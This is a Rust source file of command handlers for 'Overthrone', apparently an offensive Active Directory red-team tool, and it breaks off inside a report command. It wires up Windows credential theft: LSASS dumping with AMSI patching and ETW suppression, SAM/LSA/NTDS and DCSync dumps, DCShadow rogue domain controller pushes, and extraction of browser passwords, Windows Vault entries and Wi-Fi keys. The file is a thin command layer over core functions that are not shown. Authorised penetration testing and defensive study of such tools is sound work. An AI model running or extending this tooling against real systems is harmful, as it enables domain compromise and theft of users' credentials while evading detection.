//! Command implementations for Overthrone CLI

use crate::auth::Credentials;
use crate::banner;
use crate::{
    AdcsAction, AzureAction, BloodHoundAction, C2Action, Cli, CrackMode, DcomExecMethod,
    DmsaAction, DumpLsassMethod, DumpSource, ForgeAction, LocalCredDumperArg, MoveAction,
    OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction,
    ShadowCredAction, ShellType,
};
use colored::Colorize;
use kerberos_asn1::Asn1Object;
use overthrone_core::adcs::certifried::{
    CertifriedConfig, exploit_certifried as exploit_certifried_core,
};
use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
use overthrone_core::crypto::gpp::{decrypt_gpp_password, parse_gpp_xml};
use overthrone_core::exec::dcomexec::{
    DcomExecConfig as CoreDcomExecConfig, DcomExecMethod as CoreDcomExecMethod, dcom_exec,
};
use overthrone_core::graph::AttackGraph;
use overthrone_core::graph::queries::GraphAnalysisEngine;
use overthrone_core::plugin::{PluginContext, PluginRegistry};
use overthrone_core::proto::kerberos_brute::{KerberosBruteConfig, brute_kerberos_from_wordlist};
use overthrone_core::proto::kpasswd::{
    KpasswdConfig, kpasswd_change_password, kpasswd_reset_password,
};
use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
use overthrone_core::proto::targeted_kerberoast::{TargetedKerberoastConfig, targeted_kerberoast};
#[cfg(feature = "crawler")]
use overthrone_crawler::CrawlerConfig;
#[cfg(feature = "forge")]
use overthrone_forge::runner::{ForgeAction as RunnerForgeAction, ForgeConfig, run_forge};
#[cfg(feature = "reaper")]
use overthrone_reaper::laps::enumerate_laps;
#[cfg(feature = "reaper")]
use overthrone_reaper::runner::ReaperConfig;
use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use tracing::{debug, info, warn};

// ----------------------------------------------
// Output helpers
// ----------------------------------------------

/// Emit result as JSON to stdout (and optionally to a file), then return 0.
/// Callers should return the result of this function directly.
pub fn emit_json(cli: &Cli, value: serde_json::Value) -> i32 {
    let json_str = serde_json::to_string_pretty(&value)
        .unwrap_or_else(|e| format!("{{\"error\": \"serialization failure: {}\"}}", e));
    println!("{}", json_str);
    if let Some(ref path) = cli.outfile
        && let Err(e) = std::fs::write(path, &json_str)
    {
        eprintln!("warn: failed to write output file '{}': {}", path, e);
    }
    0
}

/// Return true when the caller requested JSON output.
#[inline]
pub fn wants_json(cli: &Cli) -> bool {
    matches!(cli.stdout_format, OutputFormat::Json)
}

// ----------------------------------------------
// cmd_sherlock -- Windows vulnerability enumeration
// ----------------------------------------------

pub async fn cmd_sherlock(
    cli: &Cli,
    os_version: Option<&str>,
    build_number: Option<u32>,
    installed_kbs: &[String],
    cves: &[String],
    format: overthrone_core::postex::SherlockOutputFormat,
) -> i32 {
    banner::print_module_banner("SHERLOCK");

    let config = overthrone_core::postex::SherlockConfig {
        os_version: os_version.map(|s| s.to_string()),
        build_number,
        installed_kbs: installed_kbs.to_vec(),
        cves_to_check: cves.to_vec(),
        output_format: format,
    };

    let result = match overthrone_core::postex::run_sherlock(&config).await {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("Sherlock failed: {e}"));
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "error",
                        "error": e.to_string(),
                    }),
                );
            }
            return 1;
        }
    };

    let score = overthrone_core::postex::result_risk_score(&result);

    if wants_json(cli) {
        return emit_json(
            cli,
            serde_json::json!({
                "status": "success",
                "os_version": result.os_version,
                "build_number": result.build_number,
                "installed_kbs": result.installed_kbs,
                "vulnerable_count": result.vulnerable_count,
                "risk_score": score,
                "findings": result.findings,
                "recommendations": result.exploit_recommendations,
            }),
        );
    }

    println!(
        " {} OS: {} (build {})",
        ">".bright_black(),
        result.os_version.cyan(),
        result
            .build_number
            .map(|b| b.to_string())
            .unwrap_or_else(|| "unknown".into())
            .cyan()
    );
    println!(
        " {} Installed KBs: {}",
        ">".bright_black(),
        result.installed_kbs.len().to_string().green()
    );
    println!(
        " {} Vulnerable findings: {} (risk score: {})",
        ">".bright_black(),
        result.vulnerable_count.to_string().red(),
        score.to_string().yellow()
    );

    for finding in &result.findings {
        if finding.is_vulnerable {
            println!(
                " {} [{}] {} - {}",
                "[!]".red(),
                finding.severity.yellow(),
                finding.cve_id.cyan(),
                finding.title.bright_black()
            );
            if !finding.missing_kbs.is_empty() {
                println!("     Missing KBs: {}", finding.missing_kbs.join(", ").red());
            }
            println!(
                "     Exploit: {}",
                finding.exploit_recommendation.bright_black()
            );
        }
    }

    if result.vulnerable_count == 0 {
        banner::print_success("No vulnerable CVEs detected for this system");
    } else {
        banner::print_fail(&format!(
            "{} vulnerable CVE(s) found (risk score: {})",
            result.vulnerable_count, score
        ));
    }

    0
}

// ----------------------------------------------
// cmd_local_creds -- Modular local credential dumpers
// ----------------------------------------------

#[allow(clippy::too_many_arguments)]
pub async fn cmd_local_creds(
    cli: &Cli,
    dumper_arg: LocalCredDumperArg,
    output: Option<&str>,
    all: bool,
    pid: Option<u32>,
    suppress_etw: bool,
    patch_amsi: bool,
    max_size_mb: usize,
) -> i32 {
    banner::print_module_banner("LOCAL CREDS");

    let dumper: overthrone_core::postex::LocalCredDumper = dumper_arg.into();

    if all {
        let configs: Vec<overthrone_core::postex::LocalCredDumperConfig> =
            overthrone_core::postex::LocalCredDumper::all()
                .iter()
                .map(|d| overthrone_core::postex::LocalCredDumperConfig {
                    dumper: *d,
                    output_path: output
                        .map(|s| format!("{}_{}.dmp", s, d.name().replace(' ', "_"))),
                    custom_pid: pid,
                    suppress_etw,
                    patch_amsi,
                    max_dump_size_mb: max_size_mb,
                    ..Default::default()
                })
                .collect();

        let results = overthrone_core::postex::dump_local_credentials_all(&configs).await;

        if wants_json(cli) {
            return emit_json(
                cli,
                serde_json::json!({
                    "status": if results.iter().any(|r| r.success) { "success" } else { "partial" },
                    "results": results,
                }),
            );
        }

        let mut total_creds = 0usize;
        let mut any_success = false;
        for result in &results {
            let status = if result.success {
                "[+]".green()
            } else {
                "[-]".red()
            };
            println!(
                " {} {}: {} credential(s)",
                status,
                result.dumper.name().cyan(),
                result.credentials.len().to_string().yellow()
            );
            total_creds += result.credentials.len();
            any_success |= result.success;
            for err in &result.errors {
                println!("     {} {}", "[-]".red(), err.red());
            }
        }

        if any_success {
            banner::print_success(&format!("Aggregated {total_creds} credential(s)"));
        } else {
            banner::print_fail(
                "All local dumpers failed (Windows-only or insufficient privileges)",
            );
            return 1;
        }
        return 0;
    }

    let config = overthrone_core::postex::LocalCredDumperConfig {
        dumper,
        output_path: output.map(|s| s.to_string()),
        custom_pid: pid,
        suppress_etw,
        patch_amsi,
        max_dump_size_mb: max_size_mb,
        ..Default::default()
    };

    let result = match unsafe { overthrone_core::postex::dump_local_credentials(&config) } {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("Dumper error: {e}"));
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "error",
                        "dumper": dumper.name(),
                        "error": e.to_string(),
                    }),
                );
            }
            return 1;
        }
    };

    if wants_json(cli) {
        return emit_json(
            cli,
            serde_json::json!({
                "status": if result.success { "success" } else { "partial" },
                "dumper": result.dumper.name(),
                "method": result.method.name(),
                "credentials": result.credentials,
                "errors": result.errors,
                "warnings": result.warnings,
            }),
        );
    }

    println!(" {} Dumper: {}", ">".bright_black(), dumper.name().cyan());
    println!(
        " {} Credentials: {}",
        ">".bright_black(),
        result.credentials.len().to_string().yellow()
    );

    for cred in &result.credentials {
        let mut parts = vec![];
        if let Some(ref h) = cred.ntlm {
            parts.push(format!("ntlm:{h}"));
        }
        if let Some(ref k) = cred.aes256 {
            parts.push(format!("aes256:{k}"));
        }
        if let Some(ref p) = cred.plaintext {
            parts.push(format!("plaintext:{p}"));
        }
        println!(
            " {} {} {}",
            "+".bright_green(),
            cred.identity.cyan(),
            parts.join(" ").bright_black()
        );
    }

    for err in &result.errors {
        println!(" {} {}", "[-]".red(), err.red());
    }

    if result.success {
        banner::print_success(&format!(
            "Dumper returned {} credential(s)",
            result.credentials.len()
        ));
    } else {
        banner::print_fail(&format!(
            "{} failed: {}",
            dumper.name(),
            result.errors.join("; ")
        ));
        return 1;
    }

    0
}

// ----------------------------------------------
// cmd_dcshadow -- Rogue DC push via MS-DRSR
// ----------------------------------------------

#[allow(clippy::too_many_arguments)]
pub async fn cmd_dcshadow(
    cli: &Cli,
    target_dc: &str,
    domain: &str,
    computer_name: &str,
    computer_password: Option<&str>,
    site_name: &str,
    listener_ip: &str,
    listener_port: u16,
    dry_run: bool,
    no_cleanup: bool,
    objects_json: Option<&str>,
) -> i32 {
    banner::print_module_banner("DCSHADOW");

    println!(" {} Target DC: {}", ">".bright_black(), target_dc.cyan());
    println!(" {} Domain: {}", ">".bright_black(), domain.cyan());
    println!(
        " {} Rogue computer: {}$",
        ">".bright_black(),
        computer_name.cyan()
    );
    println!(" {} Site: {}", ">".bright_black(), site_name.cyan());
    println!(
        " {} Listener: {}:{}",
        ">".bright_black(),
        listener_ip.cyan(),
        listener_port.to_string().cyan()
    );

    let objects_to_push: Vec<overthrone_core::postex::ShadowObject> = match objects_json {
        Some(json) => match serde_json::from_str(json) {
            Ok(objs) => objs,
            Err(e) => {
                banner::print_fail(&format!("Invalid --objects JSON: {e}"));
                if wants_json(cli) {
                    return emit_json(
                        cli,
                        serde_json::json!({
                            "status": "error",
                            "error": format!("invalid objects JSON: {e}"),
                        }),
                    );
                }
                return 1;
            }
        },
        None => Vec::new(),
    };

    let config = overthrone_core::postex::DcShadowConfig {
        target_dc: target_dc.to_string(),
        domain: domain.to_string(),
        site_name: site_name.to_string(),
        computer_name: computer_name.to_string(),
        computer_password: computer_password.unwrap_or("").to_string(),
        listener_ip: listener_ip.to_string(),
        listener_port,
        objects_to_push,
        cleanup: !no_cleanup,
        kerberos: false,
    };

    if dry_run {
        let preflight = overthrone_core::postex::preflight_dcshadow(&config).await;
        if wants_json(cli) {
            return emit_json(
                cli,
                serde_json::json!({
                    "status": "dry-run",
                    "config": {
                        "target_dc": config.target_dc,
                        "domain": config.domain,
                        "computer_name": config.computer_name,
                        "listener": format!("{}:{}", config.listener_ip, config.listener_port),
                        "objects_count": config.objects_to_push.len(),
                    },
                    "preflight": {
                        "reachable": preflight.target_dc_reachable,
                        "ldap_port_open": preflight.ldap_port_open,
                        "rpc_port_open": preflight.rpc_port_open,
                        "warnings": preflight.warnings,
                    },
                }),
            );
        }
        println!(
            " {} Reachable: {} | LDAP: {} | RPC: {}",
            ">".bright_black(),
            preflight.target_dc_reachable.to_string().cyan(),
            preflight.ldap_port_open.to_string().cyan(),
            preflight.rpc_port_open.to_string().cyan()
        );
        if !preflight.warnings.is_empty() {
            for w in &preflight.warnings {
                println!(" {} {}", "[!]".yellow(), w.yellow());
            }
        }
        banner::print_success("Dry-run configuration is valid");
        return 0;
    }

    let result = match overthrone_core::postex::run_dcshadow(&config).await {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("DCShadow error: {e}"));
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                        "status": "error",
                        "error": e.to_string(),
                    }),
                );
            }
            return 1;
        }
    };

    if wants_json(cli) {
        return emit_json(
            cli,
            serde_json::json!({
                "status": if result.success { "success" } else { "partial" },
                "success": result.success,
                "rogue_server_dn": result.rogue_server_dn,
                "rogue_ntdsdsa_dn": result.rogue_ntdsdsa_dn,
                "pushed_objects": result.pushed_objects,
                "message": result.message,
            }),
        );
    }

    println!(
        " {} Success: {}",
        ">".bright_black(),
        if result.success {
            "yes".green()
        } else {
            "no".red()
        }
    );
    println!(
        " {} Server DN: {}",
        ">".bright_black(),
        result.rogue_server_dn.cyan()
    );
    println!(
        " {} nTDSDSA DN: {}",
        ">".bright_black(),
        result.rogue_ntdsdsa_dn.cyan()
    );
    println!(
        " {} Pushed objects: {}",
        ">".bright_black(),
        result.pushed_objects.len().to_string().yellow()
    );
    println!(
        " {} Message: {}",
        ">".bright_black(),
        result.message.bright_black()
    );

    if result.success {
        banner::print_success("DCShadow chain completed");
        0
    } else {
        banner::print_fail(&format!("DCShadow did not complete: {}", result.message));
        1
    }
}

// ----------------------------------------------
// cmd_dump -- Credential Dumping
// ----------------------------------------------

pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource, user: Option<&str>) -> i32 {
    banner::print_module_banner("DUMP");
    println!(" {} Target: {}", ">".bright_black(), target.cyan());
    println!(" {} Source: {:?}", ">".bright_black(), source);

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    println!(
        " {} Authenticating as {}\\{}",
        ">".bright_black(),
        creds.domain.cyan(),
        creds.username.cyan()
    );

    // Build ExecContext from credentials (LDAPS defaults to false; no global ldaps flag on Cli)
    let ctx = match creds.to_exec_context(target, false, false) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&format!("Failed to build execution context: {}", e));
            return 1;
        }
    };

    let mut state = overthrone_pilot::goals::EngagementState::new();
    state.dc_ip = Some(target.to_string());
    state.domain = Some(creds.domain.clone());

    // Map DumpSource -> PlannedAction
    let (action, description) = match source {
        DumpSource::Sam => (
            overthrone_pilot::planner::PlannedAction::DumpSam {
                target: target.to_string(),
            },
            format!("Dump SAM credentials from {}", target),
        ),
        DumpSource::Lsa => (
            overthrone_pilot::planner::PlannedAction::DumpLsa {
                target: target.to_string(),
            },
            format!("Dump LSA secrets from {}", target),
        ),
        DumpSource::Ntds | DumpSource::Dcsync => {
            let target_user = user.map(|s| s.to_string());
            let desc = if let Some(u) = user {
                format!("DCSync user {} from {}", u, target)
            } else {
                format!("DCSync all domain credentials from {}", target)
            };
            (
                overthrone_pilot::planner::PlannedAction::DcsSync { target_user },
                desc,
            )
        }
        DumpSource::NtdsVss => (
            overthrone_pilot::planner::PlannedAction::DumpNtds {
                target: target.to_string(),
            },
            format!("NTDS via VSS+SMB @GMT shadow copy from {}", target),
        ),
        DumpSource::Dcc2 => (
            overthrone_pilot::planner::PlannedAction::DumpDcc2 {
                target: target.to_string(),
            },
            format!("Dump DCC2 cached credentials from {}", target),
        ),
    };

    let step = overthrone_pilot::planner::PlanStep {
        id: "dump-direct".to_string(),
        description: description.clone(),
        stage: overthrone_pilot::runner::Stage::Loot,
        action,
        priority: 100,
        noise: overthrone_pilot::planner::NoiseLevel::High,
        depends_on: vec![],
        executed: false,
        result: None,
        retries: 0,
        max_retries: 1,
        reversible: false,
        compensation: None,
        parallel_safe: false,
    };

    println!(" {} {}", ">".bright_black(), description.cyan());

    let result = overthrone_pilot::executor::execute_step(&step, &ctx, &mut state).await;

    if result.success {
        if wants_json(cli) {
            let loot_json: Vec<serde_json::Value> = state
                .loot
                .iter()
                .map(|l| {
                    serde_json::json!({
                    "loot_type": l.loot_type,
                    "source": l.source,
                    "entries": l.entries,
                    })
                })
                .collect();
            return emit_json(
                cli,
                serde_json::json!({
                "status": "success",
                "target": target,
                "source": format!("{:?}", source),
                "credentials_extracted": result.new_credentials,
                "loot": loot_json,
                "output": result.output,
                }),
            );
        }

        println!(
            " {} Credentials extracted: {}",
            "[+]".green(),
            result.new_credentials.to_string().yellow()
        );

        // Print any loot collected
        for loot in &state.loot {
            println!(
                " {} [{}] {} -- {} entries",
                "[*]".cyan(),
                loot.loot_type.yellow(),
                loot.source.cyan(),
                loot.entries.to_string().green()
            );
        }

        banner::print_success(&format!(
            "Dump completed -- {} credential(s) extracted",
            result.new_credentials
        ));
        0
    } else {
        if wants_json(cli) {
            return emit_json(
                cli,
                serde_json::json!({
                "status": "error",
                "target": target,
                "source": format!("{:?}", source),
                "error": result.output,
                }),
            );
        }
        banner::print_fail(&format!("Dump failed: {}", result.output));
        1
    }
}

// ----------------------------------------------
// cmd_dump_lsass -- Evasive LSASS Credential Dump (BetterSafetyKatz)
// ----------------------------------------------

pub async fn cmd_dump_lsass(
    _cli: &Cli,
    output: Option<&str>,
    method: DumpLsassMethod,
    pid: Option<u32>,
    suppress_etw: bool,
) -> i32 {
    banner::print_module_banner("LSASS DUMP");
    println!(
        " {} Method: {}",
        ">".bright_black(),
        format!("{:?}", method).cyan()
    );
    if let Some(p) = pid {
        println!(" {} PID: {}", ">".bright_black(), format!("{}", p).yellow());
    } else {
        println!(
            " {} PID: {} (auto-detect)",
            ">".bright_black(),
            "auto".cyan()
        );
    }
    if let Some(o) = output {
        println!(" {} Output: {}", ">".bright_black(), o.cyan());
    } else {
        println!(
            " {} Output: {} (memory only)",
            ">".bright_black(),
            "none".bright_black()
        );
    }
    if suppress_etw {
        println!(" {} ETW suppress: {}", ">".bright_black(), "yes".green());
    } else {
        println!(" {} ETW suppress: {}", ">".bright_black(), "no".yellow());
    }

    // Build config
    let config = overthrone_core::postex::cred_dump::CredDumpConfig {
        dump_path: output.map(|s| s.to_string()),
        use_direct_read_fallback: matches!(method, DumpLsassMethod::Auto),
        suppress_etw,
        patch_amsi: true,
        max_dump_size_mb: 4,
        custom_pid: pid,
    };

    // Run the extraction
    let result = match unsafe { overthrone_core::postex::cred_dump::extract_lsass_creds(&config) } {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("LSASS dump failed: {}", e));
            return 1;
        }
    };

    // Print results
    let has_creds = result.ntlm_count > 0 || result.aes256_count > 0;
    if has_creds {
        banner::print_success("LSASS dump completed");
    } else if result.errors.is_empty() {
        banner::print_fail("LSASS dump produced no credentials (LSASS may be PPL-protected)");
        return 1;
    } else {
        banner::print_fail(&format!("LSASS dump failed: {}", result.errors.join("; ")));
        return 1;
    }

    println!(
        " {} NTLM hashes: {}",
        ">".bright_black(),
        format!("{}", result.ntlm_count).green()
    );
    if result.aes256_count > 0 {
        println!(
            " {} AES256 keys: {}",
            ">".bright_black(),
            format!("{}", result.aes256_count).cyan()
        );
    }
    println!(
        " {} Method used: {}",
        ">".bright_black(),
        result.method.name().cyan()
    );

    for cred in &result.credentials {
        let mut pieces = vec![];
        if let Some(ref h) = cred.ntlm {
            pieces.push(format!("ntlm:{}", h));
        }
        if let Some(ref k) = cred.aes256 {
            pieces.push(format!("aes256:{}", k));
        }
        println!(
            " {} {} {}",
            "+".bright_green(),
            cred.identity.cyan(),
            pieces.join(" ").bright_black()
        );
    }

    if wants_json(_cli) {
        emit_json(_cli, serde_json::to_value(&result).unwrap_or_default());
    }

    0
}

// ----------------------------------------------
// cmd_vault -- Windows Vault / Credential Manager
// ----------------------------------------------

/// Extract credentials from Windows Vault (mimikatz vault::list + vault::cred).
pub async fn cmd_vault(cli: &Cli, backup_key_file: Option<&str>, all: bool) -> i32 {
    banner::print_module_banner("VAULT");

    // Load backup key if provided
    let backup_key = if let Some(path) = backup_key_file {
        match std::fs::read(path) {
            Ok(data) => {
                println!(
                    " {} Backup key loaded ({} bytes)",
                    ">".bright_black(),
                    data.len().to_string().cyan()
                );
                data
            }
            Err(e) => {
                banner::print_fail(&format!("Failed to read backup key file '{}': {}", path, e));
                return 1;
            }
        }
    } else {
        Vec::new()
    };

    let config = overthrone_core::postex::VaultExtractConfig {
        backup_key,
        vault_dir: None,
        user_profile_base: None,
        skip_on_error: true,
        scan_all_users: true,
    };

    let result = overthrone_core::postex::extract_vault_credentials(&config);

    if result.vaults.is_empty() {
        println!(" {} No vaults found.", "!".bright_yellow());
        if result.errors.is_empty() {
            println!("   Windows Vault may not exist on this system.");
        } else {
            for err in &result.errors {
                println!("   Error: {}", err.red());
            }
        }
        return 0;
    }

    for vault in &result.vaults {
        println!(
            "\n {} Vault: {} ({})",
            "*".bright_blue(),
            vault.name.bright_cyan(),
            vault.guid.bright_black()
        );
        println!(
            " {} Path: {:?}",
            ">".bright_black(),
            vault.path.to_string_lossy().cyan()
        );
        println!(
            " {} Items ({})",
            ">".bright_black(),
            format!("{}", vault.entry_count).yellow()
        );

        if all || vault.entry_count > 0 {
            for entry in &vault.entries {
                println!(
                    "   {} {} {} -> {} [{}]",
                    "+".bright_green(),
                    entry.resource.cyan(),
                    "=>".bright_black(),
                    entry.identity.yellow(),
                    entry.cred_type_name.bright_black()
                );
                if !entry.password.is_empty() && entry.password != "[ENCRYPTED]" {
                    println!(
                        "     {} Authenticator: {}",
                        " ".bright_black(),
                        entry.password.green()
                    );
                }
                println!(
                    "     {} Last written: {}, Flags: {:#x}",
                    " ".bright_black(),
                    entry.last_written.bright_black(),
                    entry.flags
                );
            }
        } else {
            println!("   (use --all to show decrypted entries)");
        }
    }

    println!(
        "\n {} Summary: {} vaults, {} entries ({} domain, {} generic)",
        "=".bright_blue(),
        result.vaults.len().to_string().cyan(),
        result.total_entries.to_string().yellow(),
        result.domain_password_count.to_string().green(),
        result.generic_count.to_string().green(),
    );

    if wants_json(cli) {
        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
    }

    0
}

// ----------------------------------------------
// cmd_browser -- Browser Credential Extraction
// ----------------------------------------------

/// Extract saved passwords from Chrome, Edge, Brave, Firefox, Opera.
pub async fn cmd_browser(
    cli: &Cli,
    browsers: &[String],
    backup_key_file: Option<&str>,
    profile_dir: Option<&str>,
    _all: bool,
) -> i32 {
    banner::print_module_banner("BROWSER CREDS");

    // Parse browser types
    let target_browsers: Vec<overthrone_core::postex::BrowserType> = if browsers.is_empty() {
        vec![
            overthrone_core::postex::BrowserType::Chrome,
            overthrone_core::postex::BrowserType::Edge,
            overthrone_core::postex::BrowserType::Brave,
            overthrone_core::postex::BrowserType::Firefox,
            overthrone_core::postex::BrowserType::Opera,
        ]
    } else {
        browsers
            .iter()
            .filter_map(|b| match b.to_lowercase().as_str() {
                "chrome" => Some(overthrone_core::postex::BrowserType::Chrome),
                "edge" => Some(overthrone_core::postex::BrowserType::Edge),
                "brave" => Some(overthrone_core::postex::BrowserType::Brave),
                "firefox" => Some(overthrone_core::postex::BrowserType::Firefox),
                "opera" => Some(overthrone_core::postex::BrowserType::Opera),
                "vivaldi" => Some(overthrone_core::postex::BrowserType::Vivaldi),
                _ => {
                    println!(" {} Unknown browser: '{}'", "!".bright_yellow(), b.red());
                    None
                }
            })
            .collect()
    };

    let backup_key = if let Some(path) = backup_key_file {
        match std::fs::read(path) {
            Ok(data) => data,
            Err(e) => {
                banner::print_fail(&format!("Failed to read backup key: {}", e));
                return 1;
            }
        }
    } else {
        Vec::new()
    };

    let config = overthrone_core::postex::BrowserExtractConfig {
        browsers: target_browsers,
        backup_key,
        chromium_profile: profile_dir.map(PathBuf::from),
        ..Default::default()
    };

    let result = overthrone_core::postex::extract_browser_credentials(&config);

    if result.credentials.is_empty() {
        println!(" {} No browser credentials found.", "!".bright_yellow());
        for warn in &result.warnings {
            println!("   Warning: {}", warn.yellow());
        }
        return 0;
    }

    println!(
        "\n {} Found {} credentials across {} browsers:",
        "*".bright_blue(),
        result.total_count.to_string().green(),
        result.per_browser.len().to_string().cyan()
    );

    for (browser, count) in &result.per_browser {
        if *count > 0 {
            println!(
                "   {} {} : {}",
                "+".bright_green(),
                browser.cyan(),
                count.to_string().yellow()
            );
        }
    }

    if _all {
        for cred in &result.credentials {
            println!(
                "\n   {} [{}] {}",
                "+".bright_green(),
                cred.browser.bright_black(),
                cred.origin.cyan()
            );
            println!(
                "     {} Username: {}",
                " ".bright_black(),
                cred.username.yellow()
            );
            println!(
                "     {} Password: {}",
                " ".bright_black(),
                cred.password.green()
            );
        }
    }

    if wants_json(cli) {
        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
    }

    0
}

// ----------------------------------------------
// cmd_wifi -- Wi-Fi Profile Credential Extraction
// ----------------------------------------------

/// Extract saved Wi-Fi passwords from WLAN profiles.
pub async fn cmd_wifi(
    cli: &Cli,
    backup_key_file: Option<&str>,
    profiles_dir: Option<&str>,
    _all: bool,
) -> i32 {
    banner::print_module_banner("WIFI CREDS");

    let backup_key = if let Some(path) = backup_key_file {
        match std::fs::read(path) {
            Ok(data) => data,
            Err(e) => {
                banner::print_fail(&format!("Failed to read backup key: {}", e));
                return 1;
            }
        }
    } else {
        Vec::new()
    };

    let config = overthrone_core::postex::WifiExtractConfig {
        backup_key,
        custom_profile_dir: profiles_dir.map(PathBuf::from),
        ..Default::default()
    };

    let result = overthrone_core::postex::extract_wifi_credentials(&config);

    if result.profiles.is_empty() {
        println!(" {} No Wi-Fi profiles found.", "!".bright_yellow());
        if !result.errors.is_empty() {
            for err in &result.errors {
                println!("   Error: {}", err.red());
            }
        }
        return 0;
    }

    println!(
        "\n {} Found {} Wi-Fi profiles ({} decrypted):",
        "*".bright_blue(),
        result.total_count.to_string().yellow(),
        result.decrypted_count.to_string().green()
    );

    if _all {
        for profile in &result.profiles {
            let key_display = if profile.key_material.starts_with('[') {
                profile.key_material.bright_black()
            } else {
                profile.key_material.green()
            };

            println!(
                "\n   {} {} ({} / {})",
                "+".bright_green(),
                profile.ssid.cyan(),
                profile.auth_type.bright_black(),
                profile.encryption.bright_black()
            );
            println!("     {} Key: {}", " ".bright_black(), key_display);
            println!(
                "     {} Mode: {}",
                " ".bright_black(),
                profile.connection_mode.bright_black()
            );
        }
    } else {
        for profile in &result.profiles {
            let key_status = if profile.key_material.starts_with('[') {
                "[encrypted]".red()
            } else {
                "[decrypted]".green()
            };
            println!(
                "   {} {} ({})",
                "+".bright_green(),
                profile.ssid.cyan(),
                key_status
            );
        }
        println!("\n   Use --all to show decrypted keys");
    }

    if wants_json(cli) {
        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
    }

    0
}

// ----------------------------------------------
// cmd_doctor -- Environment Diagnostics
// ----------------------------------------------

pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i32 {
    banner::print_module_banner("DOCTOR");

    let check_list = if checks.is_empty() {
        vec!["all".to_string()]
    } else {
        checks
    };

    println!(
        " {} Running checks: {}",
        ">".bright_black(),
        check_list.join(", ").cyan()
    );

    if let Some(dc_host) = dc {
        println!(
            " {} Testing connectivity to DC: {}",
            ">".bright_black(),
            dc_host.cyan()
        );

        // Test network connectivity
        println!(" {} Checking network connectivity...", ">".bright_black());
        match tokio::net::TcpStream::connect(format!("{}:445", dc_host)).await {
            Ok(_) => println!(" {} SMB (445): Reachable", "[+]".green()),
            Err(e) => println!(" {} SMB (445): Unreachable - {}", "[-]".red(), e),
        }

        match tokio::net::TcpStream::connect(format!("{}:389", dc_host)).await {
            Ok(_) => println!(" {} LDAP (389): Reachable", "[+]".green()),
            Err(e) => println!(" {} LDAP (389): Unreachable - {}", "[-]".red(), e),
        }

        match tokio::net::TcpStream::connect(format!("{}:88", dc_host)).await {
            Ok(_) => println!(" {} Kerberos (88): Reachable", "[+]".green()),
            Err(e) => println!(" {} Kerberos (88): Unreachable - {}", "[-]".red(), e),
        }
    }

    // Check dependencies
    if check_list.contains(&"all".to_string()) || check_list.contains(&"deps".to_string()) {
        println!(" {} Checking dependencies...", ">".bright_black());

        // Rust toolchain
        match std::process::Command::new("rustc")
            .arg("--version")
            .output()
        {
            Ok(o) if o.status.success() => {
                let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
                println!(" {} Rust toolchain: {}", "[+]".green(), ver);
            }
            _ => println!(" {} Rust toolchain: not found", "[-]".red()),
        }

        // OpenSSL / crypto
        #[cfg(windows)]
        {
            println!(" {} Crypto: native Windows CNG/SSPI", "[+]".green());
        }
        #[cfg(not(windows))]
        {
            match std::process::Command::new("openssl")
                .arg("version")
                .output()
            {
                Ok(o) if o.status.success() => {
                    let ver = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    println!(" {} OpenSSL: {}", "[+]".green(), ver);
                }
                _ => println!(
                    " {} OpenSSL: not found (needed on Linux/macOS)",
                    "[-]".red()
                ),
            }

            let tool_checks: [(&str, &[&str], &str); 3] = [
                ("rpcclient", &["-V"], "RID cycling / SAMR null-session"),
                (
                    "smbclient",
                    &["--version"],
                    "SMB guest/null-session interoperability",
                ),
                (
                    "ldapsearch",
                    &["-VV"],
                    "External LDAP/LDAPS troubleshooting",
                ),
            ];
            for (tool, args, purpose) in tool_checks {
                let found = std::process::Command::new(tool)
                    .args(args)
                    .output()
                    .map(|o| o.status.success())
                    .unwrap_or(false);
                if found {
                    println!(" {} {}: available ({})", "[+]".green(), tool, purpose);
                } else {
                    println!(" {} {}: not found ({})", "[-]".red(), tool, purpose);
                }
            }
        }

        // Kerberos
        #[cfg(windows)]
        {
            println!(" {} Kerberos: native Windows SSPI", "[+]".green());
        }
        #[cfg(not(windows))]
        {
            let krb_found = ["/etc/krb5.conf", "/etc/krb5/krb5.conf"]
                .iter()
                .any(|p| std::path::Path::new(p).exists())
                || std::process::Command::new("kinit")
                    .arg("--version")
                    .output()
                    .map(|o| o.status.success())
                    .unwrap_or(false);
            if krb_found {
                println!(" {} Kerberos: configured", "[+]".green());
            } else {
                println!(" {} Kerberos: krb5.conf not found", "[-]".red());
            }
        }
    }

    banner::print_success("Diagnostics complete");
    0
}

// ----------------------------------------------
// cmd_report -- Report Generation
// ----------------------------------------------

#[cfg(feature = "scribe")]
pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFormat) -> i32 {
    banner::print_module_banner("REPORT");
    println!(" {} Input: {}", ">".bright_black(), input.cyan());
    println!(" {} Output: {}", ">".bright_black(), output.cyan());
    println!(" {} Format: {:?}", ">".bright_black(), format);

    // All formats require loading the engagement session from the input file
    let input_path = std::path::Path::new(input);
    if !input_path.exists() {
        banner::print_fail(&format!("Input session file not found: {}", input));
        return 1;
    }

    let session = match overthrone_scribe::load_session(input_path).await {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("Could not parse input as engagement session: {e}"));
            return 1;
        }
    };

    if let Some(parent) = std::path::Path::new(output).parent()
